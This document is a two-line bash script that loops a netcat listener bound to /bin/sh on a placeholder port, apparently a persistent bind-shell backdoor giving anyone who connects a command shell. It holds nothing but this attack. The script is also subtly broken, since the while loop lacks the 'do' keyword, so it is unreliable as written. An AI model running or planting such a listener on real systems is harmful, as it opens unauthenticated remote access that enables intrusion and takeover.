#!/bin/bash
while [ 1 ]; nc -l -p <PORT> -e /bin/sh; done
